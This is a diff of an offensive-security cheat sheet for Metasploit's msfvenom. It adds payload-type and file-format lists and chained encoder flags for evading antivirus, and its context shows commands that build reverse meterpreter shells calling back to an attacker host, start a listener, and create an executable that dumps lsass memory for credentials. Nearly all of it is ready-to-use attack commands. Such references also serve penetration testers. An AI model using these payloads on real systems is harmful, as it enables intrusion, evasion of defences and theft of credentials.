@@ -2,7 +2,27 @@
 
 ---
 
-# Basic Exe
+# Basic Commands
+
+```
+Payloads Type:
+windows/x64/meterpreter/
+linux/x64/meterpreter/
+php/
+java/
+python/
+aspx/
+
+
+File Type:
+"exe" EXECUTE File
+"elf" LINUX Binary File
+"psh" POWERSHELL File
+
+
+```
+
+# Basic Shell
 
 ```
 LHOST = Attacker HOST
@@ -27,6 +47,10 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 # Encoding & Evasion
 
 ```
+-e x64/zutto_dekiru
+-e x64/xor_dynamic -e x64/zutto_dekiru -e x64/shikata_ga_nai
+-e x86/shikata_ga_nai
+
 6. Single Encoder
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/shikata_ga_nai -i 3 -f exe -o encoded.exe
 
@@ -120,3 +144,4 @@ msfvenom -p windows/x64/exec CMD="procdump.exe -ma lsass.exe lsass.dmp" -f exe -
 msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.1 LPORT=80 \
    HttpUserAgent="Mozilla/5.0" HttpHostHeader="10.10.10.1" -f exe -o beacon.exe
 ```
+
